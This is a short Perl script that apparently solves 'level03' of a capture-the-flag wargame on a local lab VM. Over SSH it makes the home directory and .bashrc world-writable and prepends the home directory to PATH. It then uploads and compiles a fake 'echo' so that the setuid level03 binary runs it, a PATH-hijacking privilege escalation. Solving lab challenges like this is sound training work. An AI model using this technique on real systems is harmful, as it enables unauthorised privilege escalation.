#!/usr/bin/perl

$ip = @ARGV ? $ARGV[0] : "192.168.56.2";
$user = "level03";

$red = "\e[31m";
$green = "\e[32m";
$reset = "\e[0m";

$path = "PATH=~:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin";
$input = "chmod 777 . && chmod 777 .bashrc && echo $path > .bashrc";
print $red, $input, $reset, "\n";
system("ssh -qp 4242 $user\@$ip '$input'");

$scp2 = "scp -q -P 4242 ./echo.c $user\@$ip:~";
print $green, $scp2, $reset, "\n";
system($scp2);

$tool = "gcc echo.c -o echo && ./level03";
print $red, $tool, $reset, "\n";
system("ssh -qp 4242 $user\@$ip '$tool'");
